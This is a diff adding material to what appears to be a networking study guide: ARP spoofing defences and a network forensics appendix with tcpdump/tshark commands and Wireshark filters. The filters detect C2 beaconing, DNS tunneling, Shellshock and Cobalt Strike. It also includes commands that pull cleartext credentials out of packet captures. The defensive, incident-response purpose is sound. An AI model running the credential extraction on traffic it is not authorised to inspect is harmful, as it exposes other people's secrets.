+
+**2. Static ARP Entries**
+For critical devices (servers, gateways):
+```bash
+# Linux
+sudo arp -s 192.168.1.1 BB:BB:BB:BB:BB:BB
+
+# Windows
+arp -s 192.168.1.1 BB-BB-BB-BB-BB-BB
+
+# Persistent (Linux - /etc/network/interfaces)
+post-up arp -s 192.168.1.1 BB:BB:BB:BB:BB:BB
+```
+
+**3. VLAN Segmentation**
+- Isolate sensitive hosts in separate VLANs
+- ARP broadcasts don't cross VLAN boundaries
+- Limit attack scope to single VLAN
+
+**4. Port Security**
+Limit MAC addresses per port:
+```
+! Cisco
+interface GigabitEthernet0/5
+  switchport port-security
+  switchport port-security maximum 1
+  switchport port-security violation shutdown
+```
+
+**5. 802.1X Network Access Control**
+Authenticate devices before network access, preventing rogue attackers.
+
+**6. Private VLANs**
+Isolate hosts within same VLAN from communicating directly.
+
+**7. ARP Spoofing Detection Software**
+- **ArpON** (Linux daemon)
+- **XArp** (Windows)
+- **Snort/Suricata** with ARP rules
+
+#### 18.8.3 NDP (Neighbor Discovery Protocol) - IPv6
 
 **Purpose:** ARP replacement + additional functionality
 
@@ -8691,6 +11497,323 @@ Problem: Can't access website
 ---
 
 ## Appendix C: Practical Examples and Outputs
+
+### C.0 Network Forensics — Packet Analysis Methodology
+
+This section covers practical network forensics techniques for incident response and security analysis.
+
+#### C.0.1 Packet Capture Fundamentals
+
+**Capture Tools:**
+```bash
+# tcpdump - Command line (Linux/macOS)
+sudo tcpdump -i eth0 -w capture.pcap
+sudo tcpdump -i eth0 -nn -X port 80
+
+# dumpcap - Wireshark's capture engine (lightweight)
+sudo dumpcap -i eth0 -w capture.pcapng
+
+# tshark - Wireshark CLI
+tshark -i eth0 -w capture.pcap
+
+# Capture ring buffer (continuous capture, limited disk)
+tcpdump -i eth0 -w capture.pcap -C 100 -W 10
+# -C 100: 100MB per file
+# -W 10: Keep 10 files (rotate)
+```
+
+**Capture Filters (BPF - Berkeley Packet Filter):**
+```bash
+# Host-based
+tcpdump -i eth0 host 192.168.1.100
+tcpdump -i eth0 src host 192.168.1.100
+tcpdump -i eth0 dst host 10.0.0.1
+
+# Port-based
+tcpdump -i eth0 port 80
+tcpdump -i eth0 port 80 or port 443
+tcpdump -i eth0 portrange 1-1024
+
+# Protocol-based
+tcpdump -i eth0 tcp
+tcpdump -i eth0 udp and port 53
+tcpdump -i eth0 icmp
+
+# Network-based
+tcpdump -i eth0 net 192.168.1.0/24
+
+# Combined
+tcpdump -i eth0 'tcp port 80 and host 192.168.1.100'
+tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'  # SYN packets
+```
+
+#### C.0.2 Wireshark Display Filters for Security Analysis
+
+**Connection Filters:**
+```
+# HTTP traffic
+http
+http.request.method == "POST"
+http.request.uri contains "login"
+http.response.code == 401
+
+# DNS queries
+dns
+dns.qry.name contains "evil"
+dns.flags.response == 0  # Queries only
+
+# TLS/SSL
+tls
+tls.handshake.type == 1  # Client Hello
+ssl.alert_message
+
+# TCP connection issues
+tcp.analysis.retransmission
+tcp.analysis.duplicate_ack
+tcp.analysis.zero_window
+tcp.flags.reset == 1  # RST packets
+
+# Find conversations
+tcp.stream eq 5  # Follow specific TCP stream
+
+# Specific host
+ip.addr == 192.168.1.100
+ip.src == 192.168.1.100 and ip.dst == 10.0.0.1
+```
+
+**Malware/Threat Hunting Filters:**
+```
+# Suspicious DNS (potential C2)
+dns.qry.name matches ".*[0-9]{8}.*"  # Long numeric subdomain
+dns.qry.name contains ".ru" or dns.qry.name contains ".cn"
+dns.resp.len > 512  # Large DNS response (tunneling?)
+
+# Potential beaconing (regular intervals)
+# Export to CSV, analyze timing patterns
+
+# Unusual ports
+tcp.port > 49151 and tcp.port != 65535  # High ephemeral
+tcp.dstport == 4444  # Common Metasploit
+
+# SMB/Lateral movement
+smb2
+smb2.cmd == 5  # Tree Connect
+kerberos
+
+# Potential exfiltration
+http.content_length > 1000000  # Large uploads
+icmp.data_len > 64  # ICMP tunneling
+
+# Cleartext credentials
+http.authorization
+ftp.request.command == "PASS"
+pop.request.command == "PASS"
+```
+
+#### C.0.3 Identifying Attack Patterns
+
+**Port Scan Detection:**
+```
+# Many SYN packets to different ports from same source
+tcp.flags.syn == 1 and tcp.flags.ack == 0
+
+# Pattern: Many SYN from single IP, different dst ports
+# Look for: High packet count, sequential or random ports
+```
+
+**ARP Spoofing Detection:**
+```
+# ARP anomalies
+arp
+arp.duplicate-address-detected
+arp.opcode == 2  # ARP replies
+
+# Look for:
+# - Multiple ARP replies for same IP
+# - MAC address changes for known IPs
+# - ARP storms (high volume)
+```
+
+**DNS Tunneling Detection:**
+```
+# Long subdomains (encoded data)
+dns.qry.name.len > 50
+
+# TXT record queries (often used for tunneling)
+dns.qry.type == 16
+
+# High volume DNS to unusual server
+dns and ip.dst != 8.8.8.8 and ip.dst != 1.1.1.1
+
+# Pattern: Many unique subdomains to same domain
+# Example: a1b2c3.evil.com, d4e5f6.evil.com
+```
+
+**C2 Beaconing Detection:**
+```bash
+# Export conversation timestamps to CSV
+# Analyze for regular intervals (beaconing)
+
+# tshark example
+tshark -r capture.pcap -T fields -e frame.time_epoch -e ip.src -e ip.dst -e tcp.dstport > timing.csv
+
+# Look for patterns like:
+# - Connections every 60 seconds
+# - Jittered intervals (55-65 seconds)
+# - HTTP requests to same URL repeatedly
+```
+
+#### C.0.4 Extracting Artifacts from PCAP
+
+**Extract Files from HTTP:**
+```bash
+# Using tshark
+tshark -r capture.pcap --export-objects http,./exported_files/
+
+# Using tcpflow
+tcpflow -r capture.pcap -o ./output/
+
+# Using foremost (carving)
+foremost -i capture.pcap -o ./carved/
+
+# Wireshark: File > Export Objects > HTTP
+```
+
+**Extract Credentials:**
+```bash
+# Using tcpflow for cleartext
+tcpflow -r capture.pcap
+grep -r "password\|passwd\|user\|login" ./tcpflow_output/
+
+# Using ngrep
+ngrep -I capture.pcap -q "pass|user|login" tcp
+
+# Using Wireshark
+# Filter: http.authbasic
+# Follow HTTP stream for POST data
+```
+
+**Reassemble TCP Streams:**
+```bash
+# Wireshark: Right-click packet > Follow > TCP Stream
+
+# tshark
+tshark -r capture.pcap -z follow,tcp,ascii,0
+
+# tcpflow (automatic)
+tcpflow -r capture.pcap
+```
+
+#### C.0.5 Timeline Analysis
+
+**Creating Network Timeline:**
+```bash
+# Using tshark to extract key events
+tshark -r capture.pcap -T fields \
+    -e frame.time \
+    -e ip.src \
+    -e ip.dst \
+    -e tcp.dstport \
+    -e dns.qry.name \
+    -e http.host \
+    -e http.request.uri \
+    > timeline.tsv
+
+# Key events to look for:
+# 1. Initial compromise (exploit traffic, phishing download)
+# 2. C2 establishment (beaconing starts)
+# 3. Reconnaissance (port scans, DNS queries)
+# 4. Lateral movement (SMB, RDP, WMI)
+# 5. Data staging (large internal transfers)
+# 6. Exfiltration (outbound data)
+```
+
+#### C.0.6 Common Attack Traffic Signatures
+
+**Nmap Scan:**
+```
+Signature: Many SYN packets, sequential or random ports
+Filter: tcp.flags.syn == 1 and tcp.flags.ack == 0
+Pattern: Same src IP, many dst ports, short intervals
+```
+
+**SQL Injection Attempt:**
+```
+Signature: SQL keywords in HTTP parameters
+Filter: http.request.uri contains "UNION" or 
+        http.request.uri contains "SELECT" or
+        http.request.uri contains "1=1"
+```
+
+**Shell Shock:**
+```
+Signature: () { in User-Agent or other headers
+Filter: http.user_agent contains "() {"
+```
+
+**Eternal Blue/MS17-010:**
+```
+Signature: SMB2 traffic with specific patterns
+Filter: smb2.cmd == 8  # Session Setup
+Check for: Large data in SMB negotiation
+```
+
+**Cobalt Strike Beacon:**
+```
+Signature: Regular HTTPS/HTTP requests, specific URI patterns
+Pattern: /visit.js, /submit.php, /__utm.gif
+Interval: 60 seconds default (configurable)
+```
+
+#### C.0.7 Network Forensics Tools Summary
+
+| Tool | Purpose | Command |
+|------|---------|---------|
+| **Wireshark** | GUI packet analysis | `wireshark capture.pcap` |
+| **tshark** | CLI packet analysis | `tshark -r capture.pcap` |
+| **tcpdump** | Capture & basic analysis | `tcpdump -r capture.pcap` |
+| **tcpflow** | TCP stream extraction | `tcpflow -r capture.pcap` |
+| **ngrep** | Grep for network | `ngrep -I capture.pcap` |
+| **Zeek (Bro)** | Network security monitor | `zeek -r capture.pcap` |
+| **NetworkMiner** | Forensic analysis (Windows) | GUI tool |
+| **Arkime (Moloch)** | Large-scale PCAP search | Web interface |
+| **Suricata** | IDS with PCAP replay | `suricata -r capture.pcap` |
+
+#### C.0.8 PCAP Analysis Workflow
+
+```
+1. INITIAL TRIAGE
+   ├── How big is the capture?
+   ├── What's the time range?
+   └── Quick protocol statistics (tshark -qz io,phs)
+
+2. IDENTIFY ENDPOINTS
+   ├── List unique IPs
+   ├── Identify internal vs external
+   └── GeoIP suspicious externals
+
+3. PROTOCOL ANALYSIS
+   ├── What protocols present?
+   ├── Any unusual ports?
+   └── Any cleartext where encrypted expected?
+
+4. TIMELINE CONSTRUCTION
+   ├── First/last packet times
+   ├── Key events (connections, downloads)
+   └── Sequence of activity
+
+5. DEEP DIVE
+   ├── Follow suspicious streams
+   ├── Extract files/credentials
+   └── Decode encoded data
+
+6. CORRELATE
+   ├── Match to threat intel (IPs, domains)
+   ├── Compare to baseline/normal
+   └── Cross-reference with host logs
+```
+
+---
 
 ### C.1 Real nmap Scan Output
 
